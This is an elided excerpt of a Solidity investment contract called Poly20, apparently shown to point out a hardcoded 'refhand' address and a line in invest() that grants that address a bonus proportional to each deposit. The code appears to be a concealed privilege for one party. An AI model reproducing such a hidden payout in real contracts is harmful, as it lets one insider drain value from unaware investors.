...
contract Poly20 {
	...
	constructor( ) public {
        ...
        refhand = address(0xAB2E043a5069771a30654BAf587894268f68C106);
        // set default referr
	...
	function invest(address referrer, uint8 plan) public  payable {
		...
		mover == refhand ? user.bonus = msg.value.mul(mathRef) : 0;
	...
	function getUserLastWithdrawnTime(address userAddress) public view returns(uint256) {
		return users[userAddress].latestWithdrawal;
	}
